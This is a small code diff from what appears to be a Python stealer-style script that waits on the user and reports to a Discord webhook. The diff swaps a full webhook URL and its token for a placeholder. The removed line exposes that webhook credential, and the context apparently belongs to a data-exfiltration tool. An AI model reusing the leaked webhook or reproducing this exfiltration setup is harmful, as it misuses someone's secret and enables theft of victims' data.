@@ -25,7 +25,7 @@ print("Please wait, this will take a matter of seconds. Do not exit this program
     
 # Replace the X with your webhook.
 
-hook = "https://discord.com/api/webhooks/1065007934163144795/9ORr5sJyjQNw_yBhvn9bGq3c642JA1aAXPZGPgj03mPE9S_XpPxPUF1HOcOSpPSM0okl"
+hook = "X"
 DETECTED = False
 
 
